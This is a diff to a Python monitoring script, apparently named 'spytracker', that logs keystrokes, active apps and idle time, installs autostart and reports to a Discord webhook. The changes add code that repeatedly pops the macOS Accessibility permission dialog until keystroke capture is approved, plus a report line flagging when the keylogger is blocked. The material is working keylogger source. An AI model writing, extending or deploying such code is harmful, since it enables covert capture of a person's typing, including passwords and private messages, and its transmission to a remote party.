@@ -12,6 +12,7 @@ Usage:
   tracker.py --uninstall          remove autostart and exit
   tracker.py --test               send a test message to the webhook
   tracker.py --check              check keystroke permission (macOS)
+  tracker.py --grant              pop the Accessibility dialog (macOS, one-time)
   tracker.py --once               run until one report is sent, then exit
   tracker.py --dry                collect a short sample and print (no send)
   tracker.py --config <path>      use an alternate config file
@@ -246,6 +247,10 @@ class _MacOS:
             cg.CGEventGetUnicodeString.restype = ctypes.c_ushort
             cg.CGEventSourceSecondsSinceLastEventType.restype = ctypes.c_double
             cg.CGEventSourceSecondsSinceLastEventType.argtypes = [ctypes.c_int32, ctypes.c_int32]
+            for fn in ("CGPreflightListenEventAccess", "CGRequestListenEventAccess"):
+                f = getattr(cg, fn, None)
+                if f is not None:
+                    f.restype = ctypes.c_uint8
             cf = self._cf
             cf.CFMachPortCreateRunLoopSource.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int32]
             cf.CFMachPortCreateRunLoopSource.restype = ctypes.c_void_p
@@ -259,11 +264,16 @@ class _MacOS:
             log_line(f"macOS framework load failed: {e}")
 
     def check_permission(self):
-        """Return True if a key event tap can be created right now."""
+        """True if keyboard event listening is already granted."""
         if not self._cg:
             return False
-        port = self._cg.CGEventTapCreate(0, 0, 1, 1 << 10, None, None)
-        return bool(port)
+        return bool(self._cg.CGPreflightListenEventAccess())
+
+    def request_permission(self):
+        """Ask macOS to show the Accessibility grant dialog for this process."""
+        if not self._cg:
+            return False
+        return bool(self._cg.CGRequestListenEventAccess())
 
     def active_app(self):
         try:
@@ -321,7 +331,28 @@ class _MacOS:
             return None
 
         warned = False
+        requested = False
         while running():
+            if not cg.CGPreflightListenEventAccess():
+                if not warned:
+                    log_line("WARNING: keystroke capture blocked - Accessibility not granted for "
+                             f"'{resp}'. Retrying every 5s...")
+                    warned = True
+                if not requested:
+                    requested = True
+                    try:
+                        if cg.CGRequestListenEventAccess():
+                            log_line("Accessibility request sent - approve the system dialog "
+                                     "that appeared (one-time, then it works forever).")
+                        else:
+                            log_line("Accessibility request shown - approve it in the dialog "
+                                     "(or System Settings > Privacy & Security > Accessibility "
+                                     f"add '{resp}').")
+                    except Exception as e:
+                        log_line(f"could not request Accessibility: {e}")
+                time.sleep(5)
+                continue
+            warned = False
             callback = cb_type(tap_callback)
             self._mac_tap_callback = callback
             port = cg.CGEventTapCreate(0, 0, 1, kCGEventTapKeyDown, callback, None)
@@ -630,6 +661,11 @@ class Tracker:
             for s, e in idle_ranges:
                 lines.append(f"  {self._fmt_dur(e - s)} ({self._ts(s)}-{self._ts(e)})")
         lines.append(f"**Keys:** {keys} pressed | {chars} typed (session: {self.key_total} keys)")
+        if (IS_MAC and cfg.get("keylog_enabled", True) and self._platform
+                and not self._platform.check_permission()):
+            lines.append("**KEYLOG BLOCKED:** grant Accessibility to "
+                         f"'{os.path.realpath(sys.executable)}' "
+                         "(tracker already asked - check your screen)")
 
         if cfg.get("discord_detail", True):
             if switches:
@@ -772,6 +808,17 @@ def main():
             tracker.poll_once(time.time())
             time.sleep(poll)
         print(tracker.report(send=False))
+        return
+
+    if "--grant" in args:
+        if IS_MAC and tracker._platform:
+            if tracker._platform.request_permission():
+                print("granted (or already granted) - keys are being captured")
+            else:
+                print("Check your screen: approve the Accessibility dialog if it appeared, "
+                      "then verify with: python3 ~/.spytracker/tracker.py --check")
+        else:
+            print("not needed on this platform")
         return
 
     if "--check" in args:
